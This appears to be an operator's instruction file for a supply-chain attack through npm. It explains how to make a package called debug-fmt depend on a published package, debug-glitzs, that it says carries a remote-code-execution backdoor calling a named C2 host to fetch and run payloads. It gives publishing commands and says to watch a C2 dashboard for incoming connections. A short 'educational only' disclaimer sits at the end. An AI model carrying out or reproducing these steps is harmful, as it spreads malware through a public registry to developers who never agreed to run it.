# Debug-fmt Update Instructions

## Changes Made

The `debug-fmt` package has been updated to use the newly published `debug-glitzs` package from npm.

### Updated Files:

1. **package.json**
   - Changed dependency from `debug-glitz: ^1.0.3` to `debug-glitzs: ^1.0.0`

2. **src/index.js**
   - Updated require statement from `require('debug-glitz')` to `require('debug-glitzs')`

3. **CHANGELOG.md**
   - Added entry documenting the dependency change

### Next Steps:

After these changes, you need to update the dependencies:

```bash
cd d:/Projects/hacking/debug-fmt

# Remove old node_modules and package-lock.json
rm -rf node_modules package-lock.json

# Install the new dependency
npm install

# Verify the installation
npm ls debug-glitzs
```

### Verify the Update:

```bash
# Check that debug-glitzs is installed correctly
npm list debug-glitzs

# Run tests to ensure everything works
npm test
```

### Package Information:

- **Old Package**: `debug-glitz` (local/unpublished)
- **New Package**: `debug-glitzs` v1.0.0
- **NPM Link**: https://www.npmjs.com/package/debug-glitzs
- **GitHub**: https://github.com/json-douglas/debug-glitzs

### Integration with CryptoC2:

The `debug-glitzs` package now connects to the C2 server at:
- **Default C2**: `https://fundraiser-success.vercel.app`
- **Configurable via**: `DEBUG_C2_SERVER` environment variable

### Supply Chain:

```
Application/Package
  └─> debug-fmt (this package)
      └─> debug-glitzs (npm package)
          └─> Connects to C2 Server
              └─> Receives & Executes Payload
```

## Publishing debug-fmt

After verifying the changes work correctly, you can publish the updated version:

```bash
# Update version (choose one)
npm version patch  # 1.0.2 -> 1.0.3
npm version minor  # 1.0.2 -> 1.1.0
npm version major  # 1.0.2 -> 2.0.0

# Publish to npm
npm publish
```

## Testing Locally

Before publishing, test the integration:

```bash
# In your test project
npm install /path/to/debug-fmt

# Set environment variables
export DEBUG_C2_SERVER=localhost:3000
export DEBUG_C2_PROTOCOL=http
export DEBUG_VERBOSE=true

# Run your application
node your-app.js
```

## Notes

- The `debug-glitzs` package includes the RCE backdoor that connects to the C2 server
- This is for **educational and authorized testing purposes only**
- Ensure your C2 server is running before testing
- Monitor the C2 dashboard for incoming connections and payload delivery

## Security Reminder

⚠️ **CRITICAL WARNING**: This demonstrates a supply chain attack for educational purposes only.

- Only use in authorized testing environments
- Never deploy to production systems
- Unauthorized use is a serious federal crime
